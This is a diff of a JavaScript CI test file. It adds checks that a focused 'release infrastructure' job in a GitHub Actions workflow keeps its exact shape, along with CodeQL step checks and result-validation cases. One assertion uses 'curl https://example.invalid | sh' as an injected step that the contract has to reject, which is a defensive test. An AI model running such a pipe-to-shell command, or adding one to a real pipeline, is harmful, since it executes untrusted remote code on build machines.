+    assert.equal(classification.fullMatrixRequired, true);
+  }
+  assert.throws(
+    () => isReleaseInfrastructureOnlyChangeSet({ eventName: "pull_request", changedPaths: undefined }),
+    /changedPaths must be an array/u
   );
 });
 
@@ -718,6 +1193,87 @@ test("benchmark-only PRs run one focused harness lane without launching the benc
   }
 });
 
+test("release-infrastructure PRs run only the fixed executable release contracts and canonical package", () => {
+  const workflow = parseYaml(readFileSync(new URL("../.github/workflows/ci.yml", import.meta.url), "utf8"));
+  const job = workflow?.jobs?.[RELEASE_INFRASTRUCTURE_CI_JOBS[0]];
+  const transactionFiles = [
+    "scripts/candidate-acceptance-workflow.test.mjs",
+    "scripts/create-canonical-release-artifact.test.mjs",
+    "scripts/download-canonical-github-release.test.mjs",
+    "scripts/editor-acceptance-artifact.test.mjs",
+    "scripts/marketplace-identity-profile.test.mjs",
+    "scripts/marketplace-promotion-workflow.test.mjs",
+    "scripts/marketplace-release-intake.test.mjs",
+    "scripts/open-vsx-promotion-workflow.test.mjs",
+    "scripts/package-current-channel.test.mjs",
+    "scripts/prepare-stable-candidate-tag.test.mjs",
+    "scripts/public-repository-metadata.test.mjs",
+    "scripts/publish-github-stable-release.test.mjs",
+    "scripts/push-stable-release-tag.test.mjs",
+    "scripts/registry-release-source.test.mjs",
+    "scripts/release-readiness.test.mjs",
+    "scripts/remote-jupyter-lock.test.mjs",
+    "scripts/stable-release-workflow.test.mjs",
+    "scripts/verify-canonical-release-artifact.test.mjs",
+    "scripts/verify-marketplace-publication.test.mjs",
+    "scripts/verify-open-vsx-release.test.mjs",
+    "scripts/verify-registry-release-artifact.test.mjs"
+  ];
+  const expectedJob = {
+    name: "Release infrastructure contracts",
+    needs: ["classify", "fast-feedback"],
+    if: RELEASE_INFRASTRUCTURE_CI_IF,
+    "runs-on": "ubuntu-latest",
+    "timeout-minutes": 15,
+    steps: [
+      { uses: "actions/checkout@v6" },
+      { uses: "actions/setup-node@v6", with: { "node-version": 22, cache: "npm" } },
+      { run: "npm ci" },
+      {
+        name: "Release transaction contracts",
+        run: ["node --test --test-concurrency=4", ...transactionFiles].join(" ")
+      },
+      { name: "Immutable release-media contracts", run: "npm run test:scripts:media" }
+    ]
+  };
+  const normalizeJob = (candidate) => ({
+    ...candidate,
+    if: normalizedCommand(candidate?.if),
+    steps: candidate?.steps?.map((step) =>
+      typeof step?.run === "string" ? { ...step, run: normalizedCommand(step.run) } : step
+    )
+  });
+  const assertExactJob = (candidate) => assert.deepEqual(normalizeJob(candidate), expectedJob);
+
+  assertExactJob(job);
+  assert.equal(job?.steps?.length, 5);
+  assert.deepEqual(Object.keys(job ?? {}).sort(), Object.keys(expectedJob).sort());
+  assert.throws(
+    () => assertExactJob({ ...job, steps: [...(job?.steps ?? []), { run: "curl https://example.invalid | sh" }] }),
+    "An additional focused-job step must fail the exact shape contract."
+  );
+  assert.deepEqual(nodeTestFiles(job?.steps?.[3]?.run, "release"), transactionFiles);
+  const commands = (job?.steps ?? [])
+    .filter((step) => typeof step?.run === "string")
+    .map((step) => normalizedCommand(step.run));
+  for (const forbiddenFragment of [
+    "test:python",
+    "test:r-contract",
+    "test:extension-host",
+    "test:webview-acceptance",
+    "test:packaged-editors",
+    "test:coverage",
+    "benchmark:runtime"
+  ]) {
+    assert.equal(
+      commands.some((command) => command?.includes(forbiddenFragment)),
+      false,
+      `${forbiddenFragment} belongs to full or release-candidate CI, not this focused PR tier.`
+    );
+  }
+  assert.equal(workflow?.jobs?.[PACKAGE_CI_JOBS[0]]?.if, CANONICAL_CI_IF);
+});
+
 test("authoritative CI work is independently attributable before the required aggregate", () => {
   const source = readFileSync(new URL("../.github/workflows/ci.yml", import.meta.url), "utf8");
   const workflow = parseYaml(source);
@@ -800,6 +1356,10 @@ test("ready substantive PRs run full while protected pushes keep only fast feedb
     assert.equal(job?.outputs?.draft_pull_request, "${{ steps.classify.outputs.draft_pull_request }}");
     assert.equal(job?.outputs?.lightweight_only, "${{ steps.classify.outputs.lightweight_only }}");
     assert.equal(job?.outputs?.package_only, "${{ steps.classify.outputs.package_only }}");
+    assert.equal(
+      job?.outputs?.release_infrastructure_only,
+      "${{ steps.classify.outputs.release_infrastructure_only }}"
+    );
     assert.equal(job?.outputs?.full_matrix_required, "${{ steps.classify.outputs.full_matrix_required }}");
     assert.deepEqual(job?.steps?.find((step) => step?.uses === "actions/checkout@v6")?.with, {
       "fetch-depth": 0
@@ -892,10 +1452,15 @@ test("ready substantive PRs run full while protected pushes keep only fast feedb
       assert.equal(gate?.run, "exit 1");
       const contextCarrier = job?.steps?.[1];
       assert.equal(contextCarrier?.name, "Preserve required non-matrix context");
-      assert.equal(normalizedCommand(contextCarrier?.if), NON_MATRIX_CONTEXT_IF);
+      assert.equal(
+        normalizedCommand(contextCarrier?.if),
+        relativePath === ".github/workflows/codeql.yml" ? CODEQL_NON_MATRIX_CONTEXT_IF : NON_MATRIX_CONTEXT_IF
+      );
       assert.match(contextCarrier?.run ?? "", /preserves? (?:its|this) required check context/u);
       for (const step of job?.steps?.slice(2) ?? []) {
-        if (step?.run === "npm run test:scripts:native") {
+        if (relativePath === ".github/workflows/codeql.yml") {
+          assert.equal(normalizedCommand(step?.if), CODEQL_SUBSTANTIVE_MATRIX_STEP_IF);
+        } else if (step?.run === "npm run test:scripts:native") {
           assert.match(normalizedCommand(step?.if) ?? "", /runner\.os == 'Windows'/u);
           assert.match(normalizedCommand(step?.if) ?? "", /full_matrix_required == 'true'/u);
         } else {
@@ -904,6 +1469,24 @@ test("ready substantive PRs run full while protected pushes keep only fast feedb
       }
     }
   }
+
+  const codeqlSteps = loadWorkflow(".github/workflows/codeql.yml")?.jobs?.analyze?.steps;
+  assert.equal(codeqlSteps?.length, 5, "Each required CodeQL cell must retain one gate/carrier/analysis shape.");
+  assert.equal(codeqlSteps?.[0]?.name, "Require exact change classification");
+  assert.equal(codeqlSteps?.[1]?.name, "Preserve required non-matrix context");
+  assert.equal(codeqlSteps?.[2]?.uses, "actions/checkout@v6");
+  assert.equal(codeqlSteps?.[3]?.uses, "github/codeql-action/init@v4");
+  assert.equal(codeqlSteps?.[4]?.uses, "github/codeql-action/analyze@v4");
+  assert.equal(normalizedCommand(codeqlSteps?.[1]?.if), CODEQL_NON_MATRIX_CONTEXT_IF);
+  for (const step of codeqlSteps?.slice(2) ?? []) {
+    assert.equal(normalizedCommand(step?.if), CODEQL_SUBSTANTIVE_MATRIX_STEP_IF);
+  }
+  assert.deepEqual(codeqlSteps?.[3]?.with, {
+    "config-file": "./.github/codeql-config.yml",
+    languages: "${{ matrix.language }}",
+    queries: "security-extended"
+  });
+  assert.deepEqual(codeqlSteps?.[4]?.with, { category: "/language:${{ matrix.language }}" });
 
   const nativeRuntime = loadWorkflow(".github/workflows/cross-platform.yml")?.jobs?.runtime;
   assert.equal(nativeRuntime?.["timeout-minutes"], 60);
@@ -953,6 +1536,10 @@ test("ready validation stays fail-closed while drafts report separate feedback",
   assert.equal(resultStep?.env?.DRAFT_PULL_REQUEST, "${{ needs.classify.outputs.draft_pull_request }}");
   assert.equal(resultStep?.env?.LIGHTWEIGHT_ONLY, "${{ needs.classify.outputs.lightweight_only }}");
   assert.equal(resultStep?.env?.PACKAGE_ONLY, "${{ needs.classify.outputs.package_only }}");
+  assert.equal(
+    resultStep?.env?.RELEASE_INFRASTRUCTURE_ONLY,
+    "${{ needs.classify.outputs.release_infrastructure_only }}"
+  );
   assert.equal(resultStep?.env?.FULL_MATRIX_REQUIRED, "${{ needs.classify.outputs.full_matrix_required }}");
   assert.equal(resultStep?.env?.[resultEnvironmentKey(OPTIONAL_CI_JOB)], "${{ needs.remote-workspace.result }}");
   assert.match(resultStep?.env?.REMOTE_WORKSPACE_REQUIRED ?? "", /acceptance:remote-ssh/u);
@@ -963,6 +1550,7 @@ test("required CI result validation rejects every absent or non-success blocking
     ...ALWAYS_REQUIRED_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...BENCHMARK_HARNESS_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...DEPENDENCY_LOCK_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...RELEASE_INFRASTRUCTURE_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...PACKAGE_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...FULL_MATRIX_CI_JOBS.map((jobId) => [jobId, "success"])
   ]);
@@ -974,6 +1562,7 @@ test("required CI result validation rejects every absent or non-success blocking
     ...ALWAYS_REQUIRED_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...BENCHMARK_HARNESS_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...DEPENDENCY_LOCK_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...RELEASE_INFRASTRUCTURE_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...PACKAGE_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...FULL_MATRIX_CI_JOBS.map((jobId) => [jobId, "skipped"])
   ]);
@@ -981,6 +1570,7 @@ test("required CI result validation rejects every absent or non-success blocking
     ...ALWAYS_REQUIRED_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...BENCHMARK_HARNESS_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...DEPENDENCY_LOCK_CI_JOBS.map((jobId) => [jobId, "success"]),
+    ...RELEASE_INFRASTRUCTURE_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...PACKAGE_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...FULL_MATRIX_CI_JOBS.map((jobId) => [jobId, "skipped"])
   ]);
@@ -988,7 +1578,16 @@ test("required CI result validation rejects every absent or non-success blocking
     ...ALWAYS_REQUIRED_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...BENCHMARK_HARNESS_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...DEPENDENCY_LOCK_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...RELEASE_INFRASTRUCTURE_CI_JOBS.map((jobId) => [jobId, "skipped"]),
     ...PACKAGE_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...FULL_MATRIX_CI_JOBS.map((jobId) => [jobId, "skipped"])
+  ]);
+  const releaseInfrastructureResults = Object.fromEntries([
+    ...ALWAYS_REQUIRED_CI_JOBS.map((jobId) => [jobId, "success"]),
+    ...BENCHMARK_HARNESS_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...DEPENDENCY_LOCK_CI_JOBS.map((jobId) => [jobId, "skipped"]),
+    ...RELEASE_INFRASTRUCTURE_CI_JOBS.map((jobId) => [jobId, "success"]),
+    ...PACKAGE_CI_JOBS.map((jobId) => [jobId, "success"]),
     ...FULL_MATRIX_CI_JOBS.map((jobId) => [jobId, "skipped"])
   ]);
   const validateResults = (configuration) => {
@@ -997,6 +1596,7 @@ test("required CI result validation rejects every absent or non-success blocking
       dependencyLockOnly: false,
       draftPullRequest: false,
       packageOnly: false,
+      releaseInfrastructureOnly: false,
       ...configuration
     };
     normalized.lightweightOnly ??= normalized.documentationOnly || normalized.draftPullRequest;
@@ -1005,6 +1605,7 @@ test("required CI result validation rejects every absent or non-success blocking
       !normalized.documentationOnly &&
       !normalized.packageOnly &&
       !normalized.dependencyLockOnly &&
+      !normalized.releaseInfrastructureOnly &&
       !normalized.draftPullRequest;
     return requireCiResults(normalized);
   };
@@ -1047,6 +1648,15 @@ test("required CI result validation rejects every absent or non-success blocking
       requiredResults: dependencyLockResults,
       dependencyLockOnly: true,
       documentationOnly: false,
+      remoteResult: "skipped",
+      remoteRequired: false
+    })
+  );
+  assert.doesNotThrow(() =>
+    validateResults({
+      requiredResults: releaseInfrastructureResults,
+      documentationOnly: false,
+      releaseInfrastructureOnly: true,
       remoteResult: "skipped",
       remoteRequired: false
     })
@@ -1122,6 +1732,19 @@ test("required CI result validation rejects every absent or non-success blocking
     {
       documentationOnly: false,
       packageOnly: true,
+      releaseInfrastructureOnly: true,
+      fullMatrixRequired: false,
+      message: /classifiers are mutually exclusive/u
+    },
+    {
+      documentationOnly: false,
+      releaseInfrastructureOnly: true,
+      fullMatrixRequired: true,
+      message: /full-matrix classifier is inconsistent/u
+    },
+    {
+      documentationOnly: false,
+      packageOnly: true,
       fullMatrixRequired: true,
       message: /full-matrix classifier is inconsistent/u
     },
@@ -1140,6 +1763,7 @@ test("required CI result validation rejects every absent or non-success blocking
           dependencyLockOnly: configuration.dependencyLockOnly ?? false,
           documentationOnly: configuration.documentationOnly,
           packageOnly: configuration.packageOnly,
+          releaseInfrastructureOnly: configuration.releaseInfrastructureOnly ?? false,
           fullMatrixRequired: configuration.fullMatrixRequired,
           remoteResult: "skipped",
           remoteRequired: false
@@ -1200,6 +1824,61 @@ test("required CI result validation rejects every absent or non-success blocking
             remoteRequired: false
           }),
         new RegExp(`${jobId}=${result ?? "missing"} \\(expected success\\)`, "u")
+      );
+    }
+  }
+
+  for (const jobId of RELEASE_INFRASTRUCTURE_CI_JOBS) {
+    for (const result of [undefined, "skipped", "failure", "cancelled"]) {
+      const candidate = { ...releaseInfrastructureResults };
+      if (result === undefined) delete candidate[jobId];
+      else candidate[jobId] = result;
+      assert.throws(
+        () =>
+          validateResults({
+            requiredResults: candidate,
+            documentationOnly: false,
+            releaseInfrastructureOnly: true,
+            remoteResult: "skipped",
+            remoteRequired: false
+          }),
+        new RegExp(`${jobId}=${result ?? "missing"} \\(expected success\\)`, "u")
+      );
+    }
+  }
+  for (const jobId of [...BENCHMARK_HARNESS_CI_JOBS, ...DEPENDENCY_LOCK_CI_JOBS, ...FULL_MATRIX_CI_JOBS]) {
+    for (const result of [undefined, "success", "failure", "cancelled"]) {
+      const candidate = { ...releaseInfrastructureResults };
+      if (result === undefined) delete candidate[jobId];
+      else candidate[jobId] = result;
+      assert.throws(
+        () =>
+          validateResults({
+            requiredResults: candidate,
+            documentationOnly: false,
+            releaseInfrastructureOnly: true,
+            remoteResult: "skipped",
+            remoteRequired: false
+          }),
+        new RegExp(`${jobId}=${result ?? "missing"} \\(expected skipped\\)`, "u")
+      );
+    }
+  }
+  for (const jobId of [...ALWAYS_REQUIRED_CI_JOBS, ...PACKAGE_CI_JOBS]) {
+    for (const result of [undefined, "skipped", "failure", "cancelled"]) {
+      const candidate = { ...releaseInfrastructureResults };
+      if (result === undefined) delete candidate[jobId];
+      else candidate[jobId] = result;
+      assert.throws(
+        () =>
+          validateResults({
+            requiredResults: candidate,
+            documentationOnly: false,
+            releaseInfrastructureOnly: true,
+            remoteResult: "skipped",
+            remoteRequired: false
+          }),
+        new RegExp(`${jobId}=${result ?? "missing"}`, "u")
       );
     }
   }
